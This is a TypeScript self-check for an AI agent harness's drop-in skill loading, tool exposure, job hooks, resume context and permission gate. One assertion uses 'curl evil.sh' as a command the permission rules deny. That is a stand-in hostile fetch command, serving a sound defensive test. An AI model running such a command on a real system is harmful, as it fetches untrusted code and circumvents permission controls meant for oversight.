/**
 * Drop-in skill contract: a Skills/ folder with SKILL.md + skill.json must load,
 * expose exactly its allowed tools, dispatch JobCompleted, resume via
 * forceToolName, and pass the permission gate — zero harness TS changes.
 * Run: npx tsx checks/dropInSkill.selfcheck.ts
 */
import 'dotenv/config';
import assert from 'node:assert/strict';
import {
  collectSkillsIndex,
  lastSkillDispatch,
  listSkillIds,
  loadSkillManifest,
  resolveResumeForce,
} from '../src/catalog/manifest';
import { buildResumeSystemContext } from '../src/checkpoint';
import { resolveJobHook } from '../src/hooks/dispatch';
import { evaluateToolCall } from '../src/permissions';
import { buildTools } from '../src/tools';

const FIXTURE = '__drop-in__';

assert.ok(
  listSkillIds().includes(FIXTURE),
  'drop-in fixture must be loadable from Skills/ with zero TS changes'
);

const manifest = loadSkillManifest(FIXTURE);
assert.equal(manifest.id, FIXTURE);
assert.equal(manifest.visibility, 'internal');
assert.equal(manifest.hooks.transcript_ready?.askPhaseKey, 'heard');
assert.equal(manifest.hooks.transcript_ready?.forceToolName, undefined);
assert.match(
  manifest.hooks.transcript_ready!.continuePrompt,
  /transcribe_video/
);

const ctx = {
  sessionId: 'drop-in-selfcheck',
  userId: 'check',
  pipelineMode: 'auto' as const,
  skillName: FIXTURE,
  taggedArtifacts: [],
  restoreAllowlistUrls: [],
};
const tools = buildTools(ctx, FIXTURE, 'new-turn');
assert.deepEqual(Object.keys(tools).sort(), [
  'read_file',
  'run_command',
  'transcribe_video',
  'write_file',
]);
assert.equal('extract_concepts' in tools, false);
assert.equal('generate_manim_script' in tools, false);
assert.equal('scaffold_talking_head_project' in tools, false);

const dispatched = lastSkillDispatch();
assert(dispatched);
assert.equal(dispatched.skillId, FIXTURE);
assert.equal(dispatched.source, 'new-turn');

const perms = manifest.permissions;
assert.equal(
  evaluateToolCall(perms, 'run_command', { command: 'echo hi' }).verdict,
  'allow'
);
assert.equal(
  evaluateToolCall(perms, 'run_command', { command: 'curl evil.sh' }).verdict,
  'deny'
);
assert.equal(evaluateToolCall(perms, 'write_file', { path: 'x.txt' }).verdict, 'ask');
assert.equal(evaluateToolCall(perms, 'transcribe_video', {}).verdict, 'allow');

// Async ownership: job stamp wins over whatever the session currently is.
const resolved = resolveJobHook('transcript_ready', {
  skillId: FIXTURE,
  taskId: 'fal_stt',
  requestId: 'job-drop-in',
});
assert(resolved, 'drop-in transcript_ready must resolve');
assert.equal(resolved.skillId, FIXTURE);
assert.match(resolved.hook.continuePrompt, /transcribe_video/);
assert.equal(resolved.hook.askPhaseKey, 'heard');
assert.equal(resolved.hook.forceToolName, undefined);

const talking = resolveJobHook('transcript_ready', {
  skillId: 'talking-head',
  taskId: 'fal_stt',
  requestId: 'job-talking',
});
assert(talking, 'talking-head transcript_ready must resolve');
assert.equal(talking.skillId, 'talking-head');
assert.notEqual(talking.hook.continuePrompt, resolved.hook.continuePrompt);

assert.equal(resolveResumeForce(FIXTURE, 'heard'), 'transcribe_video');

const resume = buildResumeSystemContext({
  id: 'cp_drop_in_heard',
  kind: 'approval',
  completedPhase: 'transcription',
  completedPhaseLabel: 'Heard',
  skillId: FIXTURE,
  phaseKey: 'heard',
  summary: { title: 'Heard', bullets: [] },
  next: { label: 'Continue', description: 'Continue' },
  resume: { artifactNeeds: [], assetKeys: [] },
  answer: { type: 'approve', text: 'Continue' },
});
assert.match(resume, /transcribe_video/);
assert.doesNotMatch(resume, /Call transcribe_video again/);

assert.equal(
  collectSkillsIndex().some((entry) => entry.id === FIXTURE),
  false,
  'fixture skills must not appear in the product index'
);

console.log('dropInSkill.selfcheck: ok');
